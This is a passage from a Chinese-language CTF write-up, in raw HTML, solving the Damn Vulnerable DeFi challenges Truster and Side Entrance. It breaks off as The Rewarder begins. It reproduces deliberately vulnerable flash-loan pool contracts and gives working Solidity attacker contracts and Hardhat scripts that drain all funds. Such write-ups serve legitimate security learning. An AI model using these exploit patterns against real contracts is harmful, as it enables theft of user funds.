stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：</p>\n<p>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.</p>\n<p>Currently the pool has 1 million DVT tokens in balance. And you have nothing.</p>\n<p>But don’t worry, you might be able to take them all from the pool. In a single transaction.</p></blockquote>\n<h2 id=\"code-1\"><a href=\"#code-1\" class=\"headerlink\" title=\"code\"></a>code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title TrusterLenderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TrusterLenderPool</span> <span class=\"token keyword\">is</span> ReentrancyGuard <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">;</span>\n\n    IERC20 <span class=\"token keyword\">public</span> immutable damnValuableToken<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        damnValuableToken <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint256</span> borrowAmount<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> borrower<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> target<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> data\n    <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        nonReentrant\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> balanceBefore <span class=\"token operator\">=</span> damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceBefore <span class=\"token operator\">>=</span> borrowAmount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough tokens in pool\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>borrower<span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">functionCall</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> balanceAfter <span class=\"token operator\">=</span> damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceAfter <span class=\"token operator\">>=</span> balanceBefore<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Flash loan hasn't been paid back\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"analyze-2\"><a href=\"#analyze-2\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>这道题和我之前做过的一道ctf的一种解法有些类似，vnctf公开赛的vnloan题目，总的来说就是call调用灵活性极高并且伴随着较高的危险性。</p>\n<p>比如这道题我们可以构造调用approve的data，target地址为token地址，abi编码approve(attacker,1millon)作为data，调用flashLoan()借0token，等待交易完成之后我们即可获得合约的approve，直接transferfrom即可取走全部token</p>\n<h2 id=\"attack-2\"><a href=\"#attack-2\" class=\"headerlink\" title=\"attack\"></a>attack</h2><p>attackcontract</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">import</span> <span class=\"token string\">\"./@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TrusterLenderPool1</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint256</span> borrowAmount<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> borrower<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> target<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> data\n    <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n    <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TrusterAttacker</span> <span class=\"token punctuation\">&#123;</span>\n\n    IERC20 <span class=\"token keyword\">public</span> immutable damnValuableToken<span class=\"token punctuation\">;</span>\n    TrusterLenderPool1 <span class=\"token keyword\">private</span> immutable pool<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> poolAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        damnValuableToken <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pool <span class=\"token operator\">=</span> <span class=\"token function\">TrusterLenderPool1</span><span class=\"token punctuation\">(</span>poolAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> attacker<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>damnValuableToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"approve(address,uint256)\"</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    receive <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> AttackerContractFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'TrusterAttacker'</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> attackerContract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> AttackerContractFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> attackerContract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"4-Side-entrance\"><a href=\"#4-Side-entrance\" class=\"headerlink\" title=\"4.Side entrance\"></a>4.Side entrance</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：</p>\n<p>A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.</p>\n<p>This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</p>\n<p>You must take all ETH from the lending pool.</p></blockquote>\n<h2 id=\"code-2\"><a href=\"#code-2\" class=\"headerlink\" title=\"code\"></a>code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IFlashLoanEtherReceiver</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">/**\n * @title SideEntranceLenderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SideEntranceLenderPool</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> balances<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> amountToWithdraw <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span>amountToWithdraw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> balanceBefore <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceBefore <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough ETH in balance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token function\">IFlashLoanEtherReceiver</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> amount<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> balanceBefore<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Flash loan hasn't been paid back\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        \n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"analyze-3\"><a href=\"#analyze-3\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>合约本来设有1000eth，我们要将1000eth全部取出，合约提供存取功能。在flashloan()函数总调用了接收合约的execute()函数，所以我们可以构造execute进行攻击。</p>\n<p>闪电贷1000eth，在将1000eth通过deposit()函数存入合约，此时require(address(this).balance &gt;&#x3D; balanceBefore)判断条件将会通过斌并且balances[attacker]也达到了1000eth。</p>\n<p>直接调用withdraw()函数即可。</p>\n<h2 id=\"attack-3\"><a href=\"#attack-3\" class=\"headerlink\" title=\"attack\"></a>attack</h2><p>attack contract</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SideEntranceLenderPool1</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SideEntranceAttacker</span> <span class=\"token punctuation\">&#123;</span>\n\n    SideEntranceLenderPool1 <span class=\"token keyword\">private</span> immutable pool<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> attacker<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> poolAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> attackerAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        pool <span class=\"token operator\">=</span> <span class=\"token function\">SideEntranceLenderPool1</span><span class=\"token punctuation\">(</span>poolAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        attacker <span class=\"token operator\">=</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>attackerAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        pool<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    receive <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        attacker<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> SideEntranceAttackerFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SideEntranceAttacker'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> attackerContract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> SideEntranceAttackerFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> attackerContract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token constant\">ETHER_IN_POOL</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h1 id=\"5-The-rewarder\"><a href=\"#5-The-rewarder\" class=\"headerlink\" title=\"5.The rewarder\"></a>5.The rewarder</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：</p>\n<p>There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.</p>\n<p>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</p>\n<p>You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</p>\n<p>Oh, by the way, rumours say a new pool has just landed on mainnet. Isn’t it offering DVT tokens in flash loans?</p></blockquote>\n<h2 id=\"code-3\"><a href=\"#code-3\" class=\"headerlink\" title=\"code\"></a>code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token 